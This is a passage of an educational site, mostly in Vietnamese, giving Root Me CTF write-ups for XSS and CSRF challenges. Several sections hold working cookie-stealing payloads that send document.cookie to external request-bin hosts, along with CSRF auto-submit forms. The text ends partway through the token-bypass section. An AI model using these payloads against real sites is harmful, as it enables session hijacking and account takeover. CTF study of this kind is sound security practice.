@@ -1,0 +1,1750 @@
+<!DOCTYPE HTML>
+<html lang="en" class="ayu sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>RootMe Solutions &amp; Write-Up</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+        <!-- Google tag (gtag.js) -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-E8JWH6EHCJ"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+        
+          gtag('config', 'G-E8JWH6EHCJ');
+        </script>
+        
+        <!-- HTML Meta Tags -->
+        <meta name="description" content="RootMe Solutions & Write-Up for education purposes.">
+        
+        <!-- Facebook Meta Tags -->
+        <meta property="og:url" content="https://nh4ttruong.github.io/emtoor">
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="Introduction - RootMe Solutions & Write-Up">
+        <meta property="og:description" content="RootMe Solutions & Write-Up for education purposes.">
+        <meta property="og:image" content="https://nh4ttruong.github.io/emtoor/flag.jpg">
+        
+        <!-- Twitter Meta Tags -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta property="twitter:domain" content="nh4ttruong.github.io">
+        <meta property="twitter:url" content="https://nh4ttruong.github.io/emtoor">
+        <meta name="twitter:title" content="Introduction - RootMe Solutions & Write-Up">
+        <meta name="twitter:description" content="RootMe Solutions & Write-Up for education purposes.">
+        <meta name="twitter:image" content="https://nh4ttruong.github.io/emtoor/flag.jpg">
+        
+        <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+        <meta name="description" content="RootMe solutions &amp; write-ups made for education. Hands‑on CTF guides, real hacking scenarios, and clear steps to level up your cyber skills. Let&#x27;s dive into hacking!">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon-07bb2f51.svg">
+        <link rel="shortcut icon" href="favicon-e8e8748f.png">
+        <link rel="stylesheet" href="css/variables-3865ffda.css">
+        <link rel="stylesheet" href="css/general-4c35105a.css">
+        <link rel="stylesheet" href="css/chrome-c0e702bf.css">
+        <link rel="stylesheet" href="css/print-ad67d350.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome-799aeb25.css">
+        <link rel="stylesheet" href="fonts/fonts-9644e21d.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight-493f70e1.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight-56612340.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/image-zoom-a9a84c82.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "ayu";
+            const default_dark_theme = "ayu";
+            window.path_to_searchindex_js = "searchindex-ff444667.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc-668db0a3.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">RootMe Solutions &amp; Write-Up</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/nh4ttruong/emtoor" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="root-me-solutions--write-ups"><a class="header" href="#root-me-solutions--write-ups">Root Me Solutions &amp; Write-ups</a></h1>
+<p>This repository offers write-ups and solutions for <a href="https://nh4ttruong.github.io/emtoor">Root Me CTF challenges</a>, aimed at educational and ethical hacking practice. It provides step-by-step guides for various web security, application security, and digital forensics challenges.</p>
+<blockquote>
+<p>Please read the <a href="https://nh4ttruong.github.io/emtoor/disclaimer.html"><strong>Disclaimer</strong></a> before "dive" into the challenges.</p>
+</blockquote>
+<h2 id=""><a class="header" href="#"><img src="flag.jpg" alt="Flag" /></a></h2>
+<h2 id="categories"><a class="header" href="#categories">Categories</a></h2>
+<p>This repository is organized into several categories, each focusing on different aspects of cybersecurity challenges:</p>
+<div class="table-wrapper"><table><thead><tr><th>Category</th><th>Description</th></tr></thead><tbody>
+<tr><td>Cross-Site Scripting</td><td>XSS attack techniques &amp; solutions</td></tr>
+<tr><td>CSRF</td><td>Cross-Site Request Forgery</td></tr>
+<tr><td>PHP Vulnerabilities</td><td>File inclusion, upload, etc.</td></tr>
+<tr><td>SQL Injection</td><td>SQLi types and bypasses</td></tr>
+<tr><td>Steganography</td><td>Hidden data in files/images</td></tr>
+<tr><td>Forensics</td><td>Digital forensics challenges</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>This is just my solution approach and it may not be correct at the time you attempt the challenge.</p>
+</blockquote>
+<blockquote>
+<p>🚩Flags are redacted for compliance. Guides are detailed for self-learning and education purpose only.</p>
+</blockquote>
+<hr />
+<h2 id="contributors"><a class="header" href="#contributors">Contributors</a></h2>
+<ul>
+<li><a href="https://github.com/nh4ttruong">GitHub: nh4ttruong</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cross-site-scripting-xss-challenges"><a class="header" href="#cross-site-scripting-xss-challenges">Cross-Site Scripting (XSS) Challenges</a></h1>
+<p>This section contains write-ups for Root Me XSS challenges. Each solution demonstrates exploitation techniques and provides step-by-step guidance.</p>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>XSS - Reflected</td><td><a href="Cross-Site-Scripting/./XSS-Reflected/XSS-Reflected.html">Read more</a></td></tr>
+<tr><td>XSS - Stored 1</td><td><a href="Cross-Site-Scripting/./XSS-Stored1/XSS-Stored1.html">Read more</a></td></tr>
+<tr><td>XSS - Stored 2</td><td><a href="Cross-Site-Scripting/./XSS-Stored2/XSS-Stored2.html">Read more</a></td></tr>
+<tr><td>XSS DOM Based - Introduction</td><td><a href="Cross-Site-Scripting/./XSSDOMBased-Introduction/XSSDOMBased-Introduction.html">Read more</a></td></tr>
+<tr><td>XSS DOM Based - Eval</td><td><a href="Cross-Site-Scripting/./XSS-DOMBased-Eval/XSS-DOMBased-Eval.html">Read more</a></td></tr>
+<tr><td>XSS DOM Based - AngularJS</td><td><a href="Cross-Site-Scripting/./XSSDOMBased-Angular/XSSDOMBased-Angular.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>💡 For each challenge, see the respective folder for screenshots and payloads.</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---eval"><a class="header" href="#xss-dom-based---eval"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval"><strong>XSS DOM Based - Eval</strong></a></a></h1>
+<p>Bài này cần ta thực hiện chèn XSS vào một input tính toán và bị filter bởi regex: <code>/^\d+\[\\+|\\-|\\\*|\\/\]\d+/</code></p>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image1.png" alt="" /></p>
+<p>Tuy vậy, sau khi fuzz thì thấy <strong>eval()</strong> cho phép thực thi phép toán <strong>1+1asd:</strong></p>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image2.png" alt="" /></p>
+<p>Như vậy, hướng đi của ta là chèn vào ở đây. Ta có script của server:</p>
+<pre><code class="language-javascript">&amp;lt;script&amp;gt;
+
+var result = eval(1+1asd);
+
+document.getElementById('state').innerText = '1+1asd = ' + result;
+
+&amp;lt;/script&amp;gt;
+</code></pre>
+<p>Mọi thứ đều bị filter khi cố chèn script vào đây. Đến đây, sau khi mò về Javascript thì mọi thứ có thể giải quyết với template literals (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Template literals (Template strings) - JavaScript | MDN (mozilla.org)</a>). Template literals cho phép ta thực thi một command dưới dạng ưu tiên trước khi bị block (nếu có):</p>
+<p>Thử chèn payload:</p>
+<pre><code class="language-bash">1+1\`${alert\`\`}\`
+</code></pre>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image3.png" alt="" /></p>
+<p>Và như vậy, ta có thể đính kèm DOM Based vào đây:</p>
+<p>Payload:</p>
+<pre><code class="language-bash">1+1\`${document.location="https://eol9dtzbk9673pb.m.pipedream.net?c="+document.cookie}\`
+</code></pre>
+<p>Sau 10 giây, ta nhận được HTTP request. Giờ thì chuyển qua tab Contact và send cho admin. Ta có payload như sau: <a href="http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%60$%7bdocument.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie%7d%60"><em>http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1`${document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?c=%22%2Bdocument.cookie}`</em></a></p>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image4.png" alt="" /></p>
+<p>HTTP Request nhận được sau một khoảng thời gian:</p>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image5.png" alt="" /></p>
+<p>Done:</p>
+<p><img src="Cross-Site-Scripting/XSS-DOMBased-Eval/./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-reflected"><a class="header" href="#xss-reflected"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected">XSS Reflected</a></a></h1>
+<p>Kiểm tra source website ta thấy web bị comment 1 thẻ &lt;<a>&gt; dẫn đến <code>?p=security</code>:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image1.png" alt="" /></p>
+<p>Request đến <code>?p=security</code>, website hiển thị trang web lỗi và có một hyperlink thẻ <code>&lt;a&gt;</code> hiển thị nội dung <code>security</code>:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image2.png" alt="" /></p>
+<p>Thử nhập <code>?p=&lt;giá trị khác&gt;</code>, page sẽ báo lỗi và hiển thị nội dung <code>&lt;giá trị khác&gt;</code> trong thẻ <code>&lt;a&gt;</code>. Như vậy, lợi dụng thẻ <code>&lt;a&gt;</code> này, ta thực hiện đóng quote cũng như chèn thêm event để thực hiện XSS:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image3.png" alt="" /></p>
+<p>Đến đây, sau khi thử get trực tiếp document.cookie nhưng không có giá trị, ta thực hiện gửi HTTP Request và qua RequestBin chờ cookie.</p>
+<p>Payload: <a href="http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)">http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)</a></p>
+<p>Thực hiện request với payload, sau đó ta trigger event <code>onmouseover</code> và di chuyển chuột qua thẻ <code>&lt;a&gt;</code> để chuyển hướng website:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image4.png" alt="" /></p>
+<p>Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image5.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image6.png" alt="" /></p>
+<p>Qua <strong>RequestBin</strong> và nhận flag:</p>
+<p><img src="Cross-Site-Scripting/XSS-Reflected/./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss--stored-1"><a class="header" href="#xss--stored-1"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1">XSS – Stored 1</a></a></h1>
+<p>Challenge yêu cầu ta thực hiện đánh cắp cookie phiên quản trị viên và cung cấp cho ta một website để đăng post:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image1.png" alt="" /></p>
+<p>Kiểm tra source thì thấy đây là một form với phương thức <strong>“POST”</strong>. Như tên đề bài, ta sẽ thực hiện XSS Stored vào input. Nhưng trước hết ta kiểm tra xem nó bị XSS ở đâu, ta được kết quả là nó bị tại ô input <strong>‘Message’</strong>:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image2.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image3.png" alt="" /></p>
+<p>Đầu tiên, ta thực hiện tạo một nơi để có thể thu thập các HTTP Request với https://requestbin.in:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image4.png" alt="" /></p>
+<p>Như vậy, ta có một requestbin tại https://eojx5xx99skfihj.m.pipedream.net:</p>
+<p>Tiếp theo, ta có thể đoán được chắc chắn Forum v0.001 website này bị XSS, do vậy, ta thực hiện viết payload để attack vào input của form này:</p>
+<p>Payload:</p>
+<pre><code class="language-javascript">&lt;script&gt;&lt;/script&gt;document.write("&lt;img src='https://eojx5xx99skfihj.m.pipedream.net/"+document.cookie+"'&gt;&lt;/img&gt;");&lt;/script&gt;
+</code></pre>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image5.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image6.png" alt="" /></p>
+<p>Kiểm tra request bin, ta nhận được giá trị ADMIN_COOKIE.</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored1/./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss--stored-2"><a class="header" href="#xss--stored-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2">XSS – Stored 2</a></a></h1>
+<p>Thử fuzz các payload ở tab Admin và Post nhưng không có gì xảy ra. Kiểm tra và test thử thì thấy điều đặc biệt là <strong>Status: invite</strong> ở mỗi post.</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image1.png" alt="" /></p>
+<p>Check cookie của website thì thấy nó được handle dựa trên cookie này:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image2.png" alt="" /></p>
+<p>Bỏ vào repeater và check thử thì thấy nó work:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image3.png" alt="" /></p>
+<p>Ở đây, class <strong>“nh4ttruong”</strong> sẽ là điểm đích ta tấn công. Thử nhét payload XSS vào thử:</p>
+<p><strong>Payload:</strong> <code>hehe"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image4.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image5.png" alt="" /></p>
+<p>Từ đó, ta đã có chỗ để tiêm XSS vào rồi. Tương tự các bài stored, ta tạo request bin và bơm vào:</p>
+<p><strong>Payload:</strong> <code>"&gt;&lt;script&gt;document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie).concat(%22/&gt;%22))&lt;/script&gt;</code></p>
+<p>Cookie trả về có vẻ vẫn chưa nhận được. Nhưng referer trả về ?admin=1&amp;idx=0. Nói lên rằng nó đã đi đúng hướng và admin đã đọc được:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image6.png" alt="" /></p>
+<p>Mở intercept kiểm tra source với payload tương tự thì phát hiện cookie=status=invite;” kết thúc bằng “ ”, do đó, rất có thể nó không link được đến cookie của admin</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image7.png" alt="" /></p>
+<p>Để giải quyết điều này, ta thử sử dụng hàm <strong>REPLACE</strong> để xóa bỏ <strong>“ ”</strong> và chèn vào ký tự <strong>“&amp;”</strong> để link các cookie với nhau:</p>
+<p><strong>Payload:</strong> <em>"&gt;<script>document.write("&lt;img src=https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22.concat(document.cookie.replace(%27 %27,%27&amp;%27 ).concat(%22/&gt;%22))</script></em></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image8.png" alt="" /></p>
+<p>Có <strong>ADMIN_COOKIE</strong>, ta thay đổi vào cookie và get pass:</p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image9.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSS-Stored2/./media/image10.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---angular"><a class="header" href="#xss-dom-based---angular"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS">XSS DOM Based - Angular</a></a></h1>
+<p>Thử submit giá vị vào input, ta xem được script mà website handle:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image1.png" alt="" /></p>
+<p>Mất khá nhiều thời gian để tránh filter và hiểu code. Có vẻ không thể attack bằng cách “hiểu” code được. Đề bài có tên là <strong>AngularJS,</strong> tra cứu cheatsheet XSS Angular, ta có thể tìm được payload: <strong>$on.constructor('alert(1)')()</strong></p>
+<p>Để khiến JS thực thi command, ta chèn <code>{{ }}</code> để triển khai expression:</p>
+<p><strong>{{$on.constructor('alert(1)')()}}</strong></p>
+<p>Tuy vậy, lúc chèn payload, website trả về:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image2.png" alt="" /></p>
+<p>Thử thay <strong>' "</strong> thì đã chèn thành công script:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image3.png" alt="" /></p>
+<p>Chỉnh sửa payload để thực thi DOM Based XSS attack. Ta sử dụng <strong>\"</strong> để thoát chuỗi <strong>"":</strong></p>
+<p>Payload: <strong>{{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"+document.cookie")()}}</strong></p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image4.png" alt="" /></p>
+<p>Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:</p>
+<p><a href="http://challenge01.root-me.org/web-client/ch35/?name=%7b%7b$on.constructor(%22document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?cookie=%22%20document.cookie%22)()%7d%7d"><em>http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor("document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?cookie=\"%20document.cookie")()}}</em></a></p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image5.png" alt="" /></p>
+<p>HTTP Request nhận về:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image6.png" alt="" /></p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Angular/./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="xss-dom-based---introduction"><a class="header" href="#xss-dom-based---introduction"><a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction">XSS DOM Based - Introduction</a></a></h1>
+<p>Sau khi thử submit, thì ta có thể xem được script của website:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image1.png" alt="" /></p>
+<p>Lúc này, tham số number sẽ đảm nhận nhận input. Ta thử kiểm tra XSS ở ô này bằng payload <code>‘;alert(1)//</code> thì thấy thành công:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image2.png" alt="" /></p>
+<p>Ta sẽ dùng document.location để redirect website đến HTTP Request và payload để DOM based XSS như sau (ta dùng RequestBin tạo từ https://requestbin.in): <code>';document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie;//</code></p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image3.png" alt="" /></p>
+<p>Website đã chuyển hướng thành công, giờ ta sẽ thực hiện POST lên bằng form bên tag contact:</p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image4.png" alt="" /></p>
+<p>Ta thực hiện điền payload bên dưới đến POST lên và đợi cookie được trả về tại RequestBin:</p>
+<p><a href="http://challenge01.root-me.org/web-client/ch32/?number=%27;document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie//">http://challenge01.root-me.org/web-client/ch32/?number=%27;document.location=%27https://eol9dtzbk9673pb.m.pipedream.net/?cookies=%27%2bdocument.cookie//</a></p>
+<p><img src="Cross-Site-Scripting/XSSDOMBased-Introduction/./media/image5.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf-challenges"><a class="header" href="#csrf-challenges">CSRF Challenges</a></h1>
+<p>Write-ups for Root Me CSRF (Cross-Site Request Forgery) challenges. Each guide explains the vulnerability and exploitation steps.</p>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>CSRF 0 protection</td><td><a href="CSRF/./CSRF0protection/CSRF0protection.html">Read more</a></td></tr>
+<tr><td>CSRF token bypass</td><td><a href="CSRF/./CSRFtokenbypass/CSRFtokenbypass.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>💡 Explore each folder for detailed explanations and screenshots.</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf---0-protection"><a class="header" href="#csrf---0-protection"><a href="https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection">CSRF - 0 protection</a></a></h1>
+<p>Tạo tài khoản và login vào website:</p>
+<p><img src="CSRF/CSRF0protection/./media/image1.png" alt="" /></p>
+<p>Ở tab Profile, khi ta thực hiện submit thử thì nhận được message:</p>
+<p><img src="CSRF/CSRF0protection/./media/image2.png" alt="" /></p>
+<p>Ở tab Contact, ta có thể thấy form với <code>method=“post”</code>, submit thử thì ta nhận được message:</p>
+<p><img src="CSRF/CSRF0protection/./media/image3.png" alt="" /></p>
+<p>Qua tab Private, ta thấy message:</p>
+<p><img src="CSRF/CSRF0protection/./media/image4.png" alt="" /></p>
+<p>Từ đó, ta có thể đoán ra rằng, nội dung ở tab Contact sẽ được post lên và được admin kiểm duyệt Admin có thể click vào message của ta Có thể tấn công CSRF.</p>
+<p>Để xem được tab Private, ta cần phải xác thực được Profile và từ đó ta có thể đoán được ý đồ của việc disable của nút Status là có lý do của nó. Tuy vậy, chỉ có admin mới có thể xác thực account. Kết hợp với suy luận ở trên, ta có thể thực hiện CSRF giả mạo gửi content đến cho admin và khiến script chạy để admin submit form cho ta.</p>
+<p>Qua tab Profile, inspect element và thực hiện giả mạo một form tương tự form ở tab Profile. Sau đó, chèn thêm script để admin có thể submit form:</p>
+<pre><code class="language-html">&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;&lt;/form&gt;
+
+&lt;input type="text" name="username" value="19522445"&gt;
+
+&lt;input type="checkbox" name="status" checked&gt;
+
+&lt;/form&gt;
+
+&lt;script&gt;document.getElementById("clickme").submit();&lt;/script&gt;
+</code></pre>
+<p><img src="CSRF/CSRF0protection/./media/image5.png" alt="" /></p>
+<p>Submit để gửi contact đến admin và qua tab Private để kiểm tra kết quả. Sau hơn 1 phút, ta nhận được flag:</p>
+<p><img src="CSRF/CSRF0protection/./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf--token-bypass"><a class="header" href="#csrf--token-bypass"><a href="https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass">CSRF – token bypass</a></a></h1>
+<p>Nhìn qua, ta thấy website này có các chức năng tương tự bài CSRF 0 protection. Tuy vậy, ta có thể phát hiện được ở tab Contact, có một thẻ input bị hidden có name là token:</p>
+<p><img src="CSRF/CSRFtokenbypass/./media/image1.png" alt="" /></p>
+<p>Giá trị token này sẽ thay đổi liên tục khi ta thực hiện submit form:</p>
+<p><img src="CSRF/CSRFtokenbypass/./media/image2.png" alt="" /></p>
+<p>Điều này sẽ được xác thực bởi server. Từ đó, ta cần trộm token này trước khi submit form như bài CSRF 0 protection. Ta có thể sử dụng Ajax và XMLHttpRequest() để có thể get được value này.</p>
+<pre><code class="language-html">&lt;form id="clickme" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data"&gt;
+
+&lt;input type="text" name="username" value="19522445"&gt;
+
+&lt;input type="checkbox" name="status" checked&gt;
+
+&lt;input id="token" type="hidden" name="token" value=""/&gt;
+
+&lt;button type="submit"&gt;Submit&lt;/button&gt;
+
+&lt;/form&gt;
